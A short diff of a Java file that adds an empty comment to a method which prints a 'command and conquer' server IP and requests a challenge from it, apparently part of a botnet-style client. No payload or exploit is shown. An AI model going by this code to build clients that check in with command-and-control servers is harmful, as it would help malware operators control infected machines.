@@ -59,7 +59,7 @@ else
 
 
 private boolean challengeToCommandConquer(){
-	
+	//
 	System.out.println(networkService.getCommandConquerIps().getIPList().get(0));
 		
 	Pairs<Long,Long> challenge=request.getChallengeFromCommandAndConquer(networkService.getCommandConquerIps().getIPList().get(0));
